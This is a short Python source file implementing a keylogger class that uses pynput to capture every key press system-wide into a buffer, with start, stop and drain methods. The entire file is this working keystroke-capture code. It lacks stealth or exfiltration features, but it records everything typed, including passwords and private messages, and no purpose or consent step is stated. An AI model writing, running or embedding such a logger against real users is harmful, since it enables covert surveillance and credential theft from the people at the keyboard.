from typing import List
from pynput import keyboard

class KeyLoggerService:
    def __init__(self) -> None:
        self._buf: List[str] = []
        self._listener = keyboard.Listener(on_press=self._on_press)
        self._running = False

    def _on_press(self, key) -> None:
        try:
            self._buf.append(key.char)
        except AttributeError:
            name = getattr(key, "name", str(key))
            self._buf.append(f"<{name}>")

    def start_logging(self) -> None:
        if not self._running:
            self._listener.start()
            self._running = True

    def stop_logging(self) -> None:
        if self._running:
            self._listener.stop()
            self._running = False

    def drain(self) -> List[str]:
        out = self._buf[:]
        self._buf.clear()
        return out
